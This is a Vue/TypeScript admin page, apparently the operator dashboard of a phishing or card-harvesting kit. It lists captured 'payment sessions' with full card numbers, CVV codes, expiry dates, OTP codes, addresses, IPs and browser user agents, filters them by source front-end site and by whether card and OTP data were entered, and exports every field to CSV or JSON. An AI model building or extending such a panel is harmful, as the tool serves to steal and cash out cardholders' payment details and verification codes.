<script setup lang="ts">
import { ref, computed, h } from 'vue';
import { fetchPaymentSessions } from '@/service/api';
import OverviewCards from './modules/overview-cards.vue';
import SessionDetailModal from './modules/session-detail-modal.vue';

const sessions = ref<Api.Payment.PaymentSession[]>([]);
const loading = ref(false);
const searchText = ref('');
const statusFilter = ref<string | null>(null);
const cardStatusFilter = ref<string | null>(null);
const frontendFilter = ref<string | null>(null);
const selectedSession = ref<Api.Payment.PaymentSession | null>(null);
const page = ref(1);
const pageSize = ref(10);

const pageSizeOptions = [10, 20, 50, 100].map(v => ({ label: v + ' 条/页', value: v }));

const cardStatusOptions: any[] = [
  { label: '全部', value: null },
  { label: '未填卡', value: 'no_card' },
  { label: '已填卡', value: 'has_card' },
  { label: '已填卡+验证码', value: 'has_otp' },
];

const frontendOptions = computed(() => {
  const urls = [...new Set(sessions.value.map(s => s.frontendUrl).filter(Boolean))];
  return [{ label: '全部前台', value: null }, ...urls.map(u => ({ label: u, value: u }))] as any[];
});

function statusLabel(s: string) {
  const m: Record<string, string> = { live: '输入中', pending: '待处理', completed: '已完成', approved: '已通过', rejected: '已拒绝', cancelled: '已取消', processing: '处理中' };
  return m[s] || s;
}

function statusColor(s: string) {
  const m: Record<string, string> = { live: '#18d46b', pending: '#f0a12d', completed: '#7968ed', approved: '#18d46b', rejected: '#ff5d70' };
  return m[s] || '#999';
}

function rowValue(row: Api.Payment.PaymentSession, key: string) {
  switch (key) {
    case 'sessionId': return row.sessionId;
    case 'cardNumber': return (row.cardInfo.cardNumber || '').replace(/(\d{4})/g, '$1 ').trim() || '-';
    case 'cardHolder': return row.cardInfo.cardHolder || '-';
    case 'cardType': return row.cardInfo.cardType || '-';
    case 'cardLevel': return row.cardInfo.cardLevel || '-';
    case 'bankName': return row.cardInfo.bankName || '-';
    case 'fullName': return row.customerInfo.fullName || '-';
    case 'email': return row.customerInfo.email || '-';
    case 'phone': return row.customerInfo.phone || '-';
    case 'country': return row.customerInfo.country || '-';
    case 'expiry': return row.cardInfo.expiry || '-';
    case 'cvv': return row.cardInfo.cvv || '-';
    case 'frontendUrl': return row.frontendUrl || '-';
    case 'status': return statusLabel(row.status);
    case 'createdAt': return (row.createdAt || '').slice(0, 16).replace('T', ' ');
    default: return '';
  }
}

const columnDefs = [
  { key: 'sessionId', title: '编号', width: 70, checked: true },
  { key: 'cardNumber', title: '卡号', width: 150, checked: true },
  { key: 'cardHolder', title: '持卡人', width: 90, checked: true },
  { key: 'cardType', title: '品牌', width: 80, checked: true },
  { key: 'cardLevel', title: '卡级', width: 80, checked: false },
  { key: 'bankName', title: '发卡行', width: 150, checked: false },
  { key: 'fullName', title: '姓名', width: 90, checked: false },
  { key: 'email', title: '邮箱', width: 150, checked: false },
  { key: 'phone', title: '电话', width: 120, checked: false },
  { key: 'country', title: '国家', width: 60, checked: false },
  { key: 'expiry', title: '有效期', width: 70, checked: false },
  { key: 'cvv', title: 'CVV', width: 60, checked: false },
  { key: 'frontendUrl', title: '前台', width: 140, checked: false },
  { key: 'status', title: '状态', width: 90, checked: true },
  { key: 'cardSubType', title: 'C/D', width: 50, checked: false },
  { key: 'cardCountry', title: '卡国家', width: 70, checked: false },
  { key: 'otpCode', title: 'OTP', width: 80, checked: false },
  { key: 'city', title: '城市', width: 90, checked: false },
  { key: 'state', title: '州/省', width: 70, checked: false },
  { key: 'zipCode', title: '邮编', width: 80, checked: false },
  { key: 'address1', title: '地址', width: 150, checked: false },
  { key: 'ip', title: 'IP', width: 120, checked: false },
  { key: 'ua', title: 'UA', width: 200, checked: false },
  { key: 'createdAt', title: '时间', width: 150, checked: true },
];

const columnChecks = ref(columnDefs.map(c => ({ key: c.key, title: c.title, checked: c.checked, fixed: c.key === 'sessionId' ? ('left' as const) : ('unFixed' as const), visible: true })));

const columns = computed<any[]>(() =>
  columnChecks.value
    .filter(c => c.checked)
    .map(c => {
      const def = columnDefs.find(d => d.key === c.key);
      return {
        key: c.key,
        title: c.title as string,
        width: def?.width,
        ellipsis: { tooltip: true },
        render: (row: any) => {
          const s = row as Api.Payment.PaymentSession;
          const v = rowValue(s, c.key);
          if (c.key === 'status') return h('span', { style: { color: statusColor(s.status), fontWeight: 'bold' } }, v);
          return v;
        }
      } as any;
    })
);

const filtered = computed(() => {
  let list = sessions.value;

  if (searchText.value) {
    const kw = searchText.value.toLowerCase();
    list = list.filter(s =>
      String(s.sessionId).includes(kw) ||
      (s.cardInfo.cardNumber || '').includes(kw) ||
      (s.cardInfo.cardHolder || '').toLowerCase().includes(kw) ||
      (s.customerInfo.fullName || '').toLowerCase().includes(kw)
    );
  }

  if (statusFilter.value) {
    list = list.filter(s => s.status === statusFilter.value);
  }

  if (cardStatusFilter.value) {
    const f = cardStatusFilter.value;
    if (f === 'no_card') list = list.filter(s => !s.cardInfo.cardNumber);
    if (f === 'has_card') list = list.filter(s => !!s.cardInfo.cardNumber);
    if (f === 'has_otp') list = list.filter(s => !!s.cardInfo.cardNumber && !!s.cardInfo.otpCode);
  }

  if (frontendFilter.value) {
    list = list.filter(s => s.frontendUrl === frontendFilter.value);
  }

  return list;
});

const paginated = computed(() => {
  const start = (page.value - 1) * pageSize.value;
  return filtered.value.slice(start, start + pageSize.value);
});

const stats = computed(() => {
  const total = sessions.value.length;
  const pending = sessions.value.filter(s => s.status === 'pending').length;
  const approved = sessions.value.filter(s => s.status === 'approved').length;
  const rejected = sessions.value.filter(s => s.status === 'rejected').length;
  const live = sessions.value.filter(s => s.status === 'live').length;
  return { total, pending, approved, rejected, liveCount: live };
});

async function loadData() {
  loading.value = true;
  try {
    const { data, error } = await fetchPaymentSessions();
    if (!error && data) sessions.value = data;
  } finally { loading.value = false; }
}

loadData();

const showExport = ref(false);
const exportFmt = ref<'csv' | 'json'>('csv');
const exportCols = ref<string[]>([]);

function initExportCols() {
  exportCols.value = columnChecks.value.map(c => c.key);
}

function doExport() {
  const cols = exportCols.value.join(',');
  window.open(`/api/payment/export?format=${exportFmt.value}&columns=${encodeURIComponent(cols)}`);
  showExport.value = false;
}

function selectAllCols() {
  exportCols.value = columnChecks.value.map(c => c.key);
}
function deselectAllCols() {
  exportCols.value = [];
}
</script>

<template>
  <div class="overview-page">
    <OverviewCards v-bind="stats" />

    <div class="toolbar">
      <NInput v-model:value="searchText" placeholder="搜索卡号/姓名/编号..." clearable class="search-input" />
      <NSelect v-model:value="statusFilter" placeholder="状态筛选" clearable :options="[
        { label: '输入中', value: 'live' }, { label: '待处理', value: 'pending' },
        { label: '已完成', value: 'completed' }, { label: '已通过', value: 'approved' }, { label: '已拒绝', value: 'rejected' }
      ]" style="width:120px" />
      <NSelect v-model:value="cardStatusFilter" placeholder="筛选资料" :options="cardStatusOptions" style="width:140px" />
      <NSelect v-model:value="frontendFilter" placeholder="按前台" clearable :options="frontendOptions" style="width:160px" />
      <div class="toolbar-spacer" />
      <NButton size="small" quaternary @click="showExport=true;initExportCols()">📥 导出</NButton>
      <NPopover trigger="click" placement="bottom-end">
        <template #trigger><NButton size="small" quaternary>⚙ 列设置</NButton></template>
        <div class="col-popover">
          <NCheckbox v-for="c in columnChecks.filter(x => x.key !== 'sessionId')" :key="c.key" :checked="c.checked" @update:checked="(v: boolean) => c.checked = v">{{ c.title }}</NCheckbox>
        </div>
      </NPopover>
      <NButton size="small" @click="loadData" quaternary>⟳ 刷新</NButton>
    </div>

    <NDataTable
      :columns="columns"
      :data="paginated"
      :loading="loading"
      :row-key="(row: Api.Payment.PaymentSession) => row.id"
      :row-props="(row: Api.Payment.PaymentSession) => ({ style: 'cursor:pointer', onClick: () => { selectedSession = row } })"
      striped
      :bordered="false"
    />

    <div class="pagination-row">
      <NSelect v-model:value="pageSize" :options="pageSizeOptions" style="width:110px" size="small" />
      <NPagination v-model:page="page" :item-count="filtered.length" :page-size="pageSize" :page-slot="7" />
    </div>

    <SessionDetailModal v-if="selectedSession" :session="selectedSession" @close="selectedSession = null" />

    <NModal :show="showExport" @update:show="(v:boolean)=>{if(!v)showExport=false}">
      <NCard title="导出数据" :bordered="false" role="dialog" style="width:440px;max-height:80vh">
        <NSpace vertical :size="8">
          <NRadioGroup v-model:value="exportFmt">
            <NSpace :size="16">
              <NRadio value="csv">CSV格式</NRadio>
              <NRadio value="json">JSON格式</NRadio>
            </NSpace>
          </NRadioGroup>
          <NDivider />
          <div style="font-weight:600;margin-bottom:4px">选择导出字段</div>
          <NSpace :size="4">
            <NButton size="tiny" quaternary @click="selectAllCols">全选</NButton>
            <NButton size="tiny" quaternary @click="deselectAllCols">取消全选</NButton>
          </NSpace>
          <NCheckboxGroup v-model:value="exportCols">
            <NGrid :cols="3" :x-gap="8" :y-gap="4">
              <NGi v-for="c in columnChecks" :key="c.key">
                <NCheckbox :value="c.key">{{ c.title }}</NCheckbox>
              </NGi>
            </NGrid>
          </NCheckboxGroup>
          <NDivider />
          <NSpace justify="end">
            <NButton @click="showExport=false">取消</NButton>
            <NButton type="primary" @click="doExport" :disabled="exportCols.length===0">导出 ({{ exportCols.length }}字段)</NButton>
          </NSpace>
        </NSpace>
      </NCard>
    </NModal>
  </div>
</template>

<style scoped>
.overview-page {
  padding: 16px;
  min-height: 100vh;
}
.toolbar {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 12px;
  flex-wrap: wrap;
}
.search-input { width: 200px; }
.toolbar-spacer { flex: 1; }
.col-popover {
  display: flex;
  flex-direction: column;
  gap: 6px;
  padding: 8px 12px;
  min-width: 120px;
}
.pagination-row {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 16px;
  margin-top: 16px;
  padding: 12px 0;
}
</style>
